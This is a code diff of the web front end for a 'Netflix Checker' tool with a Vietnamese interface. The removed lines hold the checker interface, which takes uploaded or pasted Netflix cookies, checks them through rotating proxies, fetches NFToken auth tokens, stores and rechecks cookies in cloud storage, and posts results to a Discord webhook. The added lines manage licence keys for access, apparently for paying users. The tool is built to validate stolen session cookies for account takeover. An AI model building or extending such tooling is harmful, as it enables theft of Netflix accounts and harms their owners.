+// ════ KEY MANAGEMENT LOGIC (ADMIN ONLY) ════
+async function generateNewKey() {
+  const duration = document.getElementById('keyDurationSelect').value;
+  toast('Đang khởi tạo Key...');
+  const res = await apiFetch('/api/keys', 'POST', { duration });
+  if (res && res.ok) { toast('Tạo Key thành công ✓'); loadAdminKeys(); } else { toast(`Lỗi: ${res?.error || 'Không thể tạo key'}`); }
 }
 
-function logout() {
-  localStorage.removeItem('nf_app_token');
-  toast('✓ Đã đăng xuất');
-  location.reload();
+async function loadAdminKeys() {
+  const container = document.getElementById('keysListContainer');
+  container.innerHTML = '<div style="text-align:center;padding:20px;"><span class="spinner"></span> Đang tải...</div>';
+  const res = await apiFetch('/api/keys');
+  if (res && res.ok) { generatedKeysList = res.data || []; renderKeysList(); } else { container.innerHTML = `<div style="color:var(--red);text-align:center;padding:12px;font-size:12px;">Không khả dụng hoặc Bạn không có quyền Admin.</div>`; }
 }
 
-function setupConfig() {
-  const wUrl = prompt('Worker URL (e.g., https://worker.example.com):', localStorage.getItem('nf_worker_url') || '');
-  if (wUrl) {
-    localStorage.setItem('nf_worker_url', wUrl.trim());
-    toast('✓ Config lưu');
-  }
+function renderKeysList() {
+  const container = document.getElementById('keysListContainer');
+  if (!generatedKeysList.length) { container.innerHTML = '<div style="text-align:center;font-size:11px;color:var(--muted);padding:20px;">Hệ thống chưa ghi nhận Key nào.</div>'; return; }
+  container.innerHTML = generatedKeysList.map(k => {
+    const isExpired = Date.now() > k.expiresAt;
+    const badge = isExpired ? '<span style="color:var(--red);background:#2a1111;font-size:9px;padding:2px 6px;border-radius:3px;font-weight:700">EXPIRED</span>' : '<span style="color:var(--green);background:var(--green-dim);font-size:9px;padding:2px 6px;border-radius:3px;font-weight:700">ACTIVE</span>';
+    return `
+    <div class="cfg-group" style="background:var(--card); border:1px solid var(--border); padding:10px; display:flex; flex-direction:column; gap:6px;">
+      <div style="display:flex; justify-content:space-between; align-items:center;">
+        <span style="font-family:var(--mono); font-size:12px; color:var(--text); font-weight:bold; word-break:break-all;">${esc(k.key)}</span>
+        ${badge}
+      </div>
+      <div style="display:flex; justify-content:space-between; align-items:center; font-size:10px; color:var(--muted)">
+        <span>Hết hạn: ${new Date(k.expiresAt).toLocaleString()}</span>
+        <div style="display:flex; gap:6px;">
+          <button class="btn-sm" style="padding:3px 8px; font-size:10px;" onclick="copyText(this, '${esc(k.key)}')">📋 Copy</button>
+          <button class="btn-sm" style="padding:3px 8px; font-size:10px; color:var(--red); border-color:var(--red-dim);" onclick="deleteAdminKey('${esc(k.id)}')">✕ Xoá</button>
+        </div>
+      </div>
+    </div>`;
+  }).join('');
 }
 
-window.addEventListener('load', async () => {
-  const token = localStorage.getItem('nf_app_token');
-  if (token) {
-    document.getElementById('authPanel').style.display = 'none';
-    document.getElementById('mainPanel').style.display = 'block';
-    loadCloudCookies();
-    loadProxies();
-    
-    const res = await apiFetch('/auth/verify', 'POST', { token });
-    if (res && res.ok) {
-      document.getElementById('userInfo').textContent = `${res.username}${res.isAdmin ? ' (Admin)' : ''}`;
-    }
-  } else {
-    document.getElementById('authPanel').style.display = 'block';
-    document.getElementById('mainPanel').style.display = 'none';
-  }
-});
-
-document.addEventListener('dragover', e => {
-  e.preventDefault();
-  document.querySelector('.drop-zone').classList.add('drag-over');
-});
-
-document.addEventListener('dragleave', () => {
-  document.querySelector('.drop-zone').classList.remove('drag-over');
-});
-
-document.addEventListener('drop', e => {
-  e.preventDefault();
-  document.querySelector('.drop-zone').classList.remove('drag-over');
-  const files = e.dataTransfer.files;
-  if (files.length > 0) handleFiles(files);
-});
-
-function handleFiles(files) {
-  for (let file of files) {
-    const reader = new FileReader();
-    reader.onload = e => {
-      document.getElementById('cookieInput').value += '\n' + e.target.result;
-    };
-    reader.readAsText(file);
-  }
-}
-
-function clearInput() {
-  if (!confirm('Clear all?')) return;
-  document.getElementById('cookieInput').value = '';
+async function deleteAdminKey(id) {
+  if(!confirm("Xác nhận thu hồi và xóa Key này khỏi hệ thống?")) return;
+  const res = await apiFetch(`/api/keys/${id}`, 'DELETE');
+  if(res && res.ok) { toast('Đã xoá key thành công ✓'); loadAdminKeys(); } else { toast(`Thất bại: ${res?.error || 'Lỗi'}`); }
 }
 </script>
-</head>
-<body>
-<header>
-  <div class="logo">Netflix <span>Checker</span></div>
-  <div class="badge">V7.0</div>
-  <div style="margin-left:auto;display:flex;align-items:center;gap:16px;">
-    <span id="userInfo" style="font-size:12px;color:var(--muted);">Loading...</span>
-    <button class="btn-sm" onclick="logout()" style="margin:0;">🚪 Logout</button>
-  </div>
-</header>
-
-<main>
-<div id="authPanel">
-  <div class="card" style="max-width:400px;margin:40px auto 0;">
-    <div class="card-title">🔐 Đăng nhập</div>
-    <div style="display:flex;flex-direction:column;gap:10px;">
-      <input type="text" placeholder="Worker URL (https://...)" id="workerUrl" style="padding:10px;">
-      <button class="btn-check" onclick="setupConfig()">⚙️ Setup Config</button>
-      <button class="btn-check" onclick="handleAuth()">🔓 Đăng nhập</button>
-    </div>
-  </div>
-</div>
-
-<div id="mainPanel" style="display:none;">
-<div class="tabs">
-  <button class="tab active" onclick="selectTab('checker')">Checker</button>
-  <button class="tab" onclick="selectTab('proxy')">Proxy</button>
-  <button class="tab" onclick="selectTab('cloud')">Cloud Storage</button>
-  <button class="tab" onclick="selectTab('settings')">Cài đặt</button>
-</div>
-
-<!-- CHECKER TAB -->
-<div id="checker-panel" class="tab-panel active">
-  <div class="card">
-    <div class="card-title">📋 Nhập Cookie</div>
-    
-    <div class="drop-zone">
-      <div class="drop-icon">📁</div>
-      <div class="drop-label">Kéo file vào đây hoặc <strong>nhấp để chọn</strong></div>
-      <input type="file" accept=".txt,.json,.netscape" onchange="handleFiles(this.files)">
-    </div>
-
-    <div class="or-div">Hoặc Dán</div>
-
-    <textarea id="cookieInput" placeholder="Paste cookies here..."></textarea>
-
-    <div class="webhook-status" id="webhookStatus">
-      <span class="webhook-status-dot"></span>
-      <span class="webhook-status-text">Webhook Disabled</span>
-    </div>
-
-    <div class="controls">
-      <button class="btn-check" onclick="checkCookie()" id="checkBtn">✓ Check Cookie</button>
-      <button class="btn-clear" onclick="clearInput()">Clear</button>
-    </div>
-
-    <div class="progress-wrap">
-      <div class="progress-bar"></div>
-    </div>
-    <div class="progress-label">Checking...</div>
-  </div>
-
-  <div class="card">
-    <div class="card-title">🔍 Kết quả</div>
-    <div id="results"></div>
-  </div>
-</div>
-
-<!-- PROXY TAB -->
-<div id="proxy-panel" class="tab-panel">
-  <div class="card">
-    <div class="card-title">🔗 Quản lý Proxy</div>
-    
-    <div class="url-row">
-      <input type="text" id="proxyInput" placeholder="Proxy format: ip:port, user:pass@ip:port, socks5://user:pass@ip:port, etc.">
-      <button class="btn-sm" onclick="addProxy()" style="flex:0">+ Add</button>
-    </div>
-
-    <div class="formats" style="margin-top:12px;">
-      <div class="fmt">ip:port</div>
-      <div class="fmt">user:pass@ip:port</div>
-      <div class="fmt">http://ip:port</div>
-      <div class="fmt">socks5://user:pass@ip:port</div>
-      <div class="fmt">ip:port|user:pass</div>
-      <div class="fmt">ip:port;user:pass</div>
-    </div>
-
-    <div style="margin-top:16px;padding:12px;background:var(--surface);border-radius:4px;">
-      <div style="font-size:10px;color:var(--muted);margin-bottom:8px;">PROXY HIỆN TẠI</div>
-      <div id="currentProxyStatus" style="font-size:11px;color:var(--muted);">
-        <span class="webhook-status-dot"></span><span class="webhook-status-text">Chưa chọn proxy</span>
-      </div>
-    </div>
-
-    <div id="proxyList" class="proxy-list"></div>
-  </div>
-</div>
-
-<!-- CLOUD TAB -->
-<div id="cloud-panel" class="tab-panel">
-  <div class="card">
-    <div class="card-title">☁️ Cloud Storage</div>
-    <div style="margin-bottom:12px;">
-      <button class="btn-check" onclick="recheckAllCloud()" style="margin:0;padding:10px;">🔄 Recheck Tất cả</button>
-      <button class="btn-clear" onclick="loadCloudCookies()" style="margin-left:8px;">🔃 Refresh</button>
-    </div>
-    <div id="cloudResults"></div>
-  </div>
-</div>
-
-<!-- SETTINGS TAB -->
-<div id="settings-panel" class="tab-panel">
-  <div class="card">
-    <div class="card-title">⚙️ Cài đặt Chung</div>
-    
-    <div class="cfg-group">
-      <div class="cfg-group-title">NFToken</div>
-      <div class="cfg-row">
-        <label class="cfg-label">Tự động lấy NFToken <small>Lấy auth token từ Netflix</small></label>
-        <label class="toggle">
-          <input type="checkbox" id="enableNFToken" checked>
-          <span class="toggle-track"></span>
-        </label>
-      </div>
-    </div>
-
-    <div class="cfg-group" style="margin-top:10px;">
-      <div class="cfg-group-title">Webhook Notifications</div>
-      <div class="webhook-url-row">
-        <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/... hoặc server khác">
-      </div>
-      <div style="margin-top:8px;font-size:10px;color:var(--muted);">
-        Results sẽ được gửi tự động đến webhook nếu URL được set.
-      </div>
-    </div>
-
-    <div class="cfg-group" style="margin-top:10px;">
-      <div class="cfg-group-title">Worker Configuration</div>
-      <button class="btn-check" onclick="setupConfig()" style="margin:0;">⚙️ Setup Worker URL</button>
-    </div>
-  </div>
-</div>
-
-</div>
-</main>
-
 </body>
 </html>
